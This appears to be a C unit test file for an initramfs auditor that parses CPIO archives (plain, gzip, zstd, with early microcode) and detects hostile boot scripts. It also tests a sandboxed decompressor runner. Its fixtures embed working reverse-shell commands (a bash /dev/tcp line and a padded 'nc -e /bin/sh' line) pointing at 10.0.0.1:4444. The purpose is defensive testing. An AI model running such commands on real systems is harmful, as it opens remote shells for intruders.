/**
 * @file test_initramfs_auditor.c
 * @brief Unit tests for the initramfs segment walker (plain/compressed/concatenated CPIO) and script auditor.
 */
#include "test_framework.h"
#include "disk_mount.h"
#include "initramfs_auditor.h"
#include "rules_fixture.h"
#include "yara_scan.h"

#include <stdlib.h>
#include <string.h>
#include <sys/stat.h>
#include <unistd.h>

#define CPIO_BUF_CAP 8192

static const char G_MALICIOUS_INIT[] = "#!/bin/sh\n"
                                       "echo 'Booting...'\n"
                                       "bash -i >& /dev/tcp/10.0.0.1/4444 0>&1\n";

static size_t align4(size_t v) {
    return (v + 3U) & ~(size_t)3U;
}

/* Append one newc entry at off (buf must be zeroed so padding is zero); returns the next aligned offset. */
static size_t cpio_add(uint8_t *buf, size_t off, const char *name, const char *data, size_t data_len) {
    char hdr[111];
    size_t namesize = strlen(name) + 1;
    snprintf(hdr, sizeof(hdr), "070701%08X%08X%08X%08X%08X%08X%08X%08X%08X%08X%08X%08X%08X",
             1U, 0100755U, 0U, 0U, 1U, 0U, (unsigned)data_len, 0U, 0U, 0U, 0U, (unsigned)namesize, 0U);
    memcpy(buf + off, hdr, 110);
    memcpy(buf + off + 110, name, namesize);
    off = align4(off + 110 + namesize);
    memcpy(buf + off, data, data_len);
    return align4(off + data_len);
}

/* Build a single-file archive terminated by TRAILER!!!; returns its length. */
static size_t cpio_build(uint8_t *buf, const char *name, const char *data, size_t data_len) {
    memset(buf, 0, CPIO_BUF_CAP);
    size_t off = cpio_add(buf, 0, name, data, data_len);
    return cpio_add(buf, off, "TRAILER!!!", "", 0);
}

static bool tool_available(const char *tool) {
    const char *const argv[] = {tool, "--version", NULL};
    if (disk_exec_argv(argv, NULL, 0, NULL) == BOOTO_OK) return true;
    printf("    [SKIP] '%s' not installed\n", tool);
    return false;
}

static booto_error_t compress_with(const char *tool, const uint8_t *in, size_t in_len, uint8_t **out, size_t *out_len) {
    const char *const argv[] = {tool, "-c", NULL};
    return disk_exec_capture(argv, in, in_len, out, out_len, 1U << 20);
}

static void test_cpio_archive_and_script_audit(void) {
    TEST_START("test_cpio_archive_and_script_audit");

    static uint8_t cpio_buf[CPIO_BUF_CAP];
    size_t len = cpio_build(cpio_buf, "init", G_MALICIOUS_INIT, strlen(G_MALICIOUS_INIT));

    initramfs_scan_result_t res;
    booto_error_t err = initramfs_audit_buffer(cpio_buf, len, &res);

    ASSERT_INT_EQ(err, BOOTO_OK, "CPIO archive audit must succeed");
    ASSERT_INT_EQ(res.files_extracted, 1, "Must extract exactly 1 file");
    ASSERT_INT_EQ(res.segments_parsed, 1, "Plain archive is one segment");
    ASSERT_STR_EQ(res.compression, "none", "Plain archive has no compression");
    ASSERT_TRUE(res.threats_detected >= 1, "Must detect reverse shell threat in init script");

    TEST_PASS("test_cpio_archive_and_script_audit");
}

static void test_gzip_compressed_initramfs(void) {
    TEST_START("test_gzip_compressed_initramfs");
    if (!tool_available("gzip")) return;

    static uint8_t cpio_buf[CPIO_BUF_CAP];
    size_t len = cpio_build(cpio_buf, "init", G_MALICIOUS_INIT, strlen(G_MALICIOUS_INIT));

    uint8_t *gz = NULL;
    size_t gz_len = 0;
    ASSERT_INT_EQ(compress_with("gzip", cpio_buf, len, &gz, &gz_len), BOOTO_OK, "gzip compression must succeed");

    initramfs_scan_result_t res;
    booto_error_t err = initramfs_audit_buffer(gz, gz_len, &res);
    free(gz);

    ASSERT_INT_EQ(err, BOOTO_OK, "gzip initramfs audit must succeed");
    ASSERT_STR_EQ(res.compression, "gzip", "Compression must be reported as gzip");
    ASSERT_TRUE(res.threats_detected >= 1, "Must detect threat inside gzip-compressed archive");

    TEST_PASS("test_gzip_compressed_initramfs");
}

static void test_microcode_plus_zstd_initramfs(void) {
    TEST_START("test_microcode_plus_zstd_initramfs");
    if (!tool_available("zstd")) return;

    static uint8_t main_cpio[CPIO_BUF_CAP];
    size_t main_len = cpio_build(main_cpio, "init", G_MALICIOUS_INIT, strlen(G_MALICIOUS_INIT));
    uint8_t *zst = NULL;
    size_t zst_len = 0;
    ASSERT_INT_EQ(compress_with("zstd", main_cpio, main_len, &zst, &zst_len), BOOTO_OK, "zstd compression must succeed");

    static uint8_t image[CPIO_BUF_CAP * 2];
    static const char ucode[] = "\x01\x02\x03\x04microcode-blob";
    size_t early_len = cpio_build(image, "kernel/x86/microcode/GenuineIntel.bin", ucode, sizeof(ucode) - 1);
    size_t off = (early_len + 511U) & ~(size_t)511U; // GNU cpio pads early archives to 512 with zeros
    ASSERT_TRUE(off + zst_len <= sizeof(image), "Test image fits");
    memset(image + early_len, 0, off - early_len);
    memcpy(image + off, zst, zst_len);
    free(zst);

    initramfs_scan_result_t res;
    booto_error_t err = initramfs_audit_buffer(image, off + zst_len, &res);

    ASSERT_INT_EQ(err, BOOTO_OK, "Concatenated initramfs audit must succeed");
    ASSERT_TRUE(res.segments_parsed >= 2, "Early microcode and main archive must both be parsed");
    ASSERT_STR_EQ(res.compression, "zstd", "Compression must be reported as zstd");
    ASSERT_TRUE(res.threats_detected >= 1, "Must detect threat in compressed main archive");

    TEST_PASS("test_microcode_plus_zstd_initramfs");
}

static void test_truncated_and_garbage_rejected(void) {
    TEST_START("test_truncated_and_garbage_rejected");

    static uint8_t cpio_buf[CPIO_BUF_CAP];
    size_t len = cpio_build(cpio_buf, "init", G_MALICIOUS_INIT, strlen(G_MALICIOUS_INIT));

    initramfs_scan_result_t res;
    ASSERT_INT_EQ(initramfs_audit_buffer(cpio_buf, len - 20, &res), BOOTO_ERR_CORRUPT_DATA,
                  "Truncated archive must be CORRUPT_DATA");

    memcpy(cpio_buf + len, "GARBAGE!", 8);
    ASSERT_INT_EQ(initramfs_audit_buffer(cpio_buf, len + 8, &res), BOOTO_ERR_CORRUPT_DATA,
                  "Unknown data after archive must be CORRUPT_DATA");

    cpio_buf[60] = 'z'; // corrupt a hex digit of the filesize field
    ASSERT_INT_EQ(initramfs_audit_buffer(cpio_buf, len, &res), BOOTO_ERR_CORRUPT_DATA,
                  "Non-hex header field must be CORRUPT_DATA");

    TEST_PASS("test_truncated_and_garbage_rejected");
}

static void test_padded_line_detected(void) {
    TEST_START("test_padded_line_detected");

    static char script[4096];
    static uint8_t cpio_buf[CPIO_BUF_CAP];
    size_t n = (size_t)snprintf(script, sizeof(script), "#!/bin/sh\necho ");
    memset(script + n, 'A', 2100);
    n += 2100;
    n += (size_t)snprintf(script + n, sizeof(script) - n, "; nc -e /bin/sh 10.0.0.1 4444\n");

    size_t len = cpio_build(cpio_buf, "scripts/init-top/pad", script, n);

    initramfs_scan_result_t res;
    ASSERT_INT_EQ(initramfs_audit_buffer(cpio_buf, len, &res), BOOTO_OK, "Audit must succeed");
    ASSERT_TRUE(res.threats_detected >= 1, "Pattern after 2000+ bytes of padding must be detected");
    ASSERT_STR_EQ(res.findings[0].matched_pattern, "nc -e", "Netcat pattern must be matched");

    TEST_PASS("test_padded_line_detected");
}

static void test_exec_capture_output_cap(void) {
    TEST_START("test_exec_capture_output_cap");
    if (!tool_available("head")) return;

    const char *const argv[] = {"head", "-c", "100000", "/dev/zero", NULL};
    uint8_t sentinel = 0;
    uint8_t *out = &sentinel;
    size_t out_len = 1;
    booto_error_t err = disk_exec_capture(argv, NULL, 0, &out, &out_len, 1000);

    ASSERT_INT_EQ(err, BOOTO_ERR_CORRUPT_DATA, "Exceeding max_out must be CORRUPT_DATA");
    ASSERT_TRUE(out == NULL && out_len == 0, "Output must be cleared on error");

    TEST_PASS("test_exec_capture_output_cap");
}

static void test_exec_capture_sandboxed(void) {
    TEST_START("test_exec_capture_sandboxed");
    if (!tool_available("sh")) return;

    const char *const argv[] = {"sh", "-c", "ulimit -t; ulimit -f; grep NoNewPrivs /proc/self/status; id -u", NULL};
    uint8_t *out = NULL;
    size_t out_len = 0;
    ASSERT_INT_EQ(disk_exec_capture(argv, NULL, 0, &out, &out_len, 4096), BOOTO_OK, "Sandboxed child runs");
    char text[4097] = {0};
    memcpy(text, out, out_len);
    free(out);
    ASSERT_TRUE(strstr(text, "60\n0\n") == text, "CPU limit 60 s and no file writes");
    ASSERT_TRUE(strstr(text, "NoNewPrivs:\t1") != NULL, "no_new_privs is set");
    if (geteuid() == 0) ASSERT_TRUE(strstr(text, "\n65534\n") != NULL, "Root drops to nobody");

    TEST_PASS("test_exec_capture_sandboxed");
}

/* Run sh -c script in the sandbox; returns its status and frees the output. */
static booto_error_t sandbox_run(const char *script) {
    const char *const argv[] = {"sh", "-c", script, NULL};
    uint8_t *out = NULL;
    size_t out_len = 0;
    booto_error_t err = disk_exec_capture(argv, NULL, 0, &out, &out_len, 4096);
    free(out);
    return err;
}

/* Escape attempts a hostile decompressor could make: each must fail inside the sandbox. */
static void test_exec_capture_escape_attempts(void) {
    TEST_START("test_exec_capture_escape_attempts");
    if (!tool_available("sh")) return;
    char script[512];

    char path[] = "/tmp/booto_sandbox_XXXXXX";
    int fd = mkstemp(path);
    ASSERT_TRUE(fd >= 0, "Temp file created");
    close(fd);
    chmod(path, 0666);
    snprintf(script, sizeof(script), "echo escaped > %s", path);
    sandbox_run(script);
    struct stat st;
    ASSERT_TRUE(stat(path, &st) == 0 && st.st_size == 0, "Child must not write to disk");

    if (tool_available("dd"))
        ASSERT_TRUE(sandbox_run("dd if=/dev/zero of=/dev/null bs=1500M count=1") != BOOTO_OK,
                    "Child must not allocate past the 1 GiB memory cap");

    if (tool_available("sudo"))
        ASSERT_TRUE(sandbox_run("sudo -n true") != BOOTO_OK, "Child must not gain root through setuid sudo");

    if (geteuid() == 0) {
        FILE *f = fopen(path, "w");
        ASSERT_TRUE(f != NULL, "Root writes the secret");
        if (f) { fputs("secret", f); fclose(f); }
        chmod(path, 0600);
        snprintf(script, sizeof(script), "cat %s", path);
        ASSERT_TRUE(sandbox_run(script) != BOOTO_OK, "Child must not read a root-only file");
    }
    unlink(path);

    TEST_PASS("test_exec_capture_escape_attempts");
}

/* An ELF file inside the archive goes through the signed YARA rules. */
static void test_yara_on_elf_entry(void) {
    TEST_START("test_yara_on_elf_entry");
    char dir[] = "/tmp/booto_initrd_yara_XXXXXX";
    ASSERT_TRUE(mkdtemp(dir) != NULL, "temp rules dir");
    char path[96];
    snprintf(path, sizeof(path), "%s/%s", dir, YARA_RULES_FILE);
    static const char rule[] = "rule T_ELF { meta: severity = \"HIGH\" description = \"marked ELF\" "
                               "strings: $a = \"EVILMARK\" condition: uint32(0) == 0x464C457F and $a }";
    FILE *f = fopen(path, "wb");
    ASSERT_TRUE(f != NULL, "write rules");
    fwrite(rule, 1, sizeof(rule) - 1, f);
    fclose(f);
    rules_fixture_sign(path, rule, sizeof(rule) - 1);
    setenv("BOOTO_RULES_DIR", dir, 1);
    setenv("BOOTO_RULES_DIR_ONLY", "1", 1);
    rules_reset_cache();

    static uint8_t cpio_buf[CPIO_BUF_CAP];
    static const char elf[] = "\x7f" "ELF....EVILMARK";
    size_t len = cpio_build(cpio_buf, "usr/bin/x", elf, sizeof(elf) - 1);
    initramfs_scan_result_t res;
    ASSERT_INT_EQ(initramfs_audit_buffer(cpio_buf, len, &res), BOOTO_OK, "audit ok");
    ASSERT_INT_EQ(res.threats_detected, 1, "ELF entry flagged");
    ASSERT_STR_EQ(res.findings[0].matched_pattern, "T_ELF", "rule id recorded");

    unsetenv("BOOTO_RULES_DIR");
    unsetenv("BOOTO_RULES_DIR_ONLY");
    rules_fixture_done();
    rules_reset_cache();
    char sig[110];
    snprintf(sig, sizeof(sig), "%s.sig", path);
    unlink(sig);
    unlink(path);
    rmdir(dir);
    TEST_PASS("test_yara_on_elf_entry");
}

int main(void) {
    printf("\n--- Running Initramfs CPIO Auditor Tests ---\n");
    test_cpio_archive_and_script_audit();
    test_gzip_compressed_initramfs();
    test_microcode_plus_zstd_initramfs();
    test_truncated_and_garbage_rejected();
    test_padded_line_detected();
    test_yara_on_elf_entry();
    test_exec_capture_output_cap();
    test_exec_capture_sandboxed();
    test_exec_capture_escape_attempts();
    TEST_SUMMARY();
    return 0;
}
